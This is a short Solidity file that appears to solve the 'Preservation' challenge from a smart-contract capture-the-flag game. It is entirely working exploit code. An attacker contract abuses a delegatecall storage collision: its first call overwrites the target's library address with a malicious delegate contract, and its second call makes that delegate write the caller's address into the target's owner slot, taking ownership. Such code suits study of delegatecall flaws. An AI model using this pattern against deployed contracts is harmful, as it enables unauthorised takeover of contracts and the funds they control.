// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

interface IPreservation {
    function setFirstTime(uint _timeStamp) external;
}

contract PreservationAttacker {
    address public challengeInstance;
    address public delegateInstance;

    constructor(address _challengeInstance, address _delegateInstance) {
        challengeInstance = _challengeInstance;
        delegateInstance = _delegateInstance;
    }

    function attack() external {
        IPreservation(challengeInstance).setFirstTime(uint256(uint160(delegateInstance)));
        IPreservation(challengeInstance).setFirstTime(uint256(uint160(msg.sender)));
    }
}

contract PreservationDelegator {
    address public variable1;
    address public variable2;
    address public owner;

    function setTime(uint _timeStamp) external {
        owner = address(bytes20(uint160(_timeStamp)));
    }
}